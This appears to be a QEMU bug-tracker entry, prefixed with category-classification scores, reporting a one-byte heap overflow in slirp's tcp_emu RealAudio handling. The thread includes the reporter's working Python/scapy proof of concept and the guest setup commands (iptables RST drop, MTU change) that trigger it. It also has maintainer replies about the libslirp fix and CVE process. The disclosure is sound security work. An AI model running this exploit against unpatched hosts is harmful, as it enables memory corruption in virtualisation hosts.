@@ -1,0 +1,124 @@
+other: 0.093
+network: 0.085
+socket: 0.078
+files: 0.075
+device: 0.075
+permissions: 0.074
+PID: 0.072
+debug: 0.071
+boot: 0.066
+performance: 0.065
+semantic: 0.065
+graphic: 0.063
+vnc: 0.062
+KVM: 0.056
+network: 0.694
+debug: 0.056
+files: 0.039
+other: 0.036
+socket: 0.033
+PID: 0.030
+boot: 0.019
+device: 0.018
+semantic: 0.017
+performance: 0.013
+KVM: 0.012
+graphic: 0.012
+vnc: 0.012
+permissions: 0.009
+
+in tcp_emu function has OOB bug
+
+qemu version: 4.1.0 
+
+```c
+int tcp_emu(struct socket *so, struct mbuf *m){
+............
+case EMU_REALAUDIO:
+............
+    while (bptr < m->m_data + m->m_len) {
+        case 6:
+............
+            lport = (((uint8_t *)bptr)[0] << 8) + ((uint8_t *)bptr)[1];
+............               
+            *(uint8_t *)bptr++ = (p >> 8) & 0xff;
+            *(uint8_t *)bptr = p & 0xff;
+............
+    }
+............
+............
+}
+```
+
+bptr)[1] and  bptr++ ,may make bptr ==  m->m_data + m->m_len,and cause OOB（out of bounds.）
+
+Thanks for your bug report. For future security critical bugs, please follow the steps described on https://wiki.qemu.org/SecurityProcess instead.
+For this one, I've forwarded the information to the libslirp project, since the "slirp" code has been moved to a separate project which is no longer part of the QEMU project. They've included a fix here:
+https://gitlab.freedesktop.org/slirp/libslirp/commit/2655fffed7a9e765bcb4701dd876e9dab975f289
+
+Thanks
+
+poc:
+```python
+#!/usr/bin/python3
+
+import os
+import time
+from scapy.all import *
+
+target_ip = '10.0.2.2'
+target_port = 7070
+
+def start_tcp(target_ip,target_port,str_to_send):
+    global sport,s_seq,d_seq
+    try:
+        ans = sr1(IP(dst=target_ip)/TCP(dport=target_port,sport=RandShort(),seq=RandInt(),flags=0x2),verbose=False)
+        sport = ans[TCP].dport
+        s_seq = ans[TCP].ack
+        d_seq = ans[TCP].seq+1
+        
+        send(IP(dst=target_ip)/TCP(dport=target_port,sport=sport,ack=d_seq,seq=s_seq,flags=0x10),verbose=False)
+
+        send(IP(dst=target_ip)/TCP(dport=target_port,sport=sport,ack=d_seq,seq=s_seq,flags=0x18)/str_to_send,verbose=False)
+        print(ans[TCP])
+    except Exception as e:
+        print(e)
+
+if __name__ == '__main__':
+    buf = ['R' for n in range(2200)];
+    buf_len = len(buf);
+    
+    buf[buf_len-10]= chr(0x50)
+    buf[buf_len-9] = chr(0x4e)
+    buf[buf_len-8] = chr(0x41)
+    buf[buf_len-7] = chr(0x00)
+    buf[buf_len-1] = chr(27)
+    start_tcp(target_ip,target_port,"".join(buf))
+```
+
+In host OS run:
+
+```shell
+nc -l -p 7070 
+```
+
+In guest OS run:
+
+```shell
+# iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.0.2.2 -j DROP # Because we will use Python to construct tcp packets, this will prevent the kernel from sending rst packets.
+# ip link set ens3 mtu 3000 # When the sending size is larger than the default mtu packet, the slipr_input function allocates space from the heap, and then we can overflow one byte of the heap space
+# ./poc
+```
+
+This will cause a byte heap overflow.
+
+Excuse me, can I get a CVE number?
+
+If you need a CVE number, please send a mail with the bug description to the people listed on https://wiki.qemu.org/SecurityProcess
+
+thank you very much！
+
+This should be fixed with QEMU v5.0.
+
+libslirp fix included in commit 7769c23774d1, released in QEMU-v5.0.0
+
